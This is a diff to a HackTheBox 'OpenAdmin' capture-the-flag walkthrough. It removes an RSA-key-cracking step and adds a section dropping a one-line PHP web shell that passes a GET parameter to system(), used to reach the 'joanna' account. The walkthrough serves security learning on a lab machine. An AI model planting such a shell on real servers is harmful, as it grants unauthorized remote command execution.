@@ -12,7 +12,6 @@
 - Password Cracking using john.
 - Port Forwarding (to be able to access internal website).
 - Dropping a webshell on the internal site.
-- Cracking RSA private key.
 
 ## STEPS:
 > PORT SCANNNING
@@ -221,6 +220,23 @@ ssh jimmy@openadmin.htb -L 52846:localhost:52846
 
 31. BUT, remembering we got access to the internal site. Hence we don't actually need to crack the ssh key.
 32. We can drop webshell to get access to **joanna** account.
+
+> SIMPLE WEBSHELL
+
+```txt
+<?php system($_GET["cmd"]); ?>
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bb102120-f63f-4402-a6f1-caf8f7286388)
+
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0cc28e9d-8b29-4633-acd7-e3bb5099d091)
+
+
+
+
 
 
 
